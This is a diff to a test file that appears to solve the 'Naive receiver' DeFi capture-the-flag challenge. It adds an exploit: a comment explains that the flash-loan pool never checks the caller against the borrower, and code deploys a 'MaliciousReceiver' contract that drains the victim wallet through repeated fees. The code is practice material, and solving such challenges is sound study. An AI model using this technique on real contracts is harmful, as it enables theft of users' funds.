@@ -30,7 +30,20 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** EXPLOIT
+            The pool doesn't verifiy that the caller of the 'flashLoan' function is the same as the borrower. 
+            Abusing this with the pool's FIXED_FEE allows to empty any wallet implementing the 'receiveEther' function. 
+            To do it in one transaction, we can use a contract that will call the 'flashLoan' repeatedly in its constructor 
+            as a contract's deployement happens in one single transaction.
+
+            Version with multiple attacker transactions :
+            const LenderPoolAttackerInstance = this.pool.connect(attacker);
+            for (var i = 0; i < 10; i++){
+                await LenderPoolAttackerInstance.flashLoan(this.receiver.address, max_receiver_ether);
+            }
+        */
+        const AttackerContractFactory = await ethers.getContractFactory('MaliciousReceiver', attacker);
+        this.attackerContract = await AttackerContractFactory.deploy(this.pool.address, this.receiver.address, parseInt(ethers.utils.formatEther(ETHER_IN_RECEIVER)));
     });
 
     after(async function () {
